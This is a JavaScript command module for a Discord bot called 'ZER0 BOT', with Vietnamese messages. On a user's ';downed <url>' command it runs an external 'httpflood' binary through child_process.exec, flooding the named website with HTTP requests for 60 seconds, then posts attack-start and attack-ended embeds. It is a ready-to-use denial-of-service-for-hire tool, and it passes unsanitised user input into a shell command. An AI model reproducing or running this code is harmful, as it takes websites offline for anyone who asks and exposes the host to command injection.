const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../premium.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu ;downed https://example.com/`")
	.setFooter("Vui lòng không tấn công các website có domain .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`./httpflood ${host} 10000 get 60 nil`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ZER0 BOT** 🔥')
	.setTimestamp()
	.setDescription("**► Cuộc tấn công đã kết thúc 💥**")
	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ZER0 BOT** 🔥')
	.setTimestamp()
	.setDescription("**Người Dùng**: `PREMIUM ☭` \n **Máy Chủ**: `" + host + "` \n **Phương Thức**: `ExtraDowned 💥` \n **Thời gian**: `60 giây 🕒`")
	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['downed'],
  permLevel: 0
}

exports.help = {
  name: 'downed',
  description: 'zxcr9999',
  usage: 'downed'
}